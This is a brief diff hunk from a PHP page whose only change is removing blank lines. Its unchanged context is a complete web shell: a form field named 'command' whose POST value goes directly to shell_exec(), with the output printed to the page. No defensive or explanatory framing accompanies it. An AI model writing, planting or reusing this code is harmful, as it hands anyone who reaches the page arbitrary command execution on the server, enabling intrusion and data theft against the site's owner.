@@ -4,10 +4,8 @@ command : <input type="text" name="command">
 </form>
 
 <?php
-
 $command = $_POST['command'];
 echo "<pre>";
 echo shell_exec($command);
 echo "</pre>";
-
 ?>
